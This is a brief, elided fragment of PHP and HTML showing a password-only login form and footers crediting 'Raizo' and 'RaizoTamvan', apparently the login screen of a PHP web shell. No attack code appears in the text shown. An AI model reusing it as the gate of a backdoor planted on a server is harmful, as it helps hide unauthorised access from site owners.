...
?>
				<div class="input-group mb-3">
					<input type="password" class="form-control form-control-sm" name="pwd" placeholder="" required="required">
					<button type="submit" class="btn btn-primary btn-sm"><i class="bi bi-arrow-return-right"></i></button>
				</div>
			</form>
		<div class="text-secondary">&copy; <?=date("Y");?> Raizo</div>
		</div>
	</div>
</div>
</body>
...
<body style="background-color:#000;color:#fff;font-family:serif;">
	...
	<div class="bg-dark border text-center mt-2">
		<small>Since &copy; 2016 - Powered By RaizoTamvan</small>
	</div>
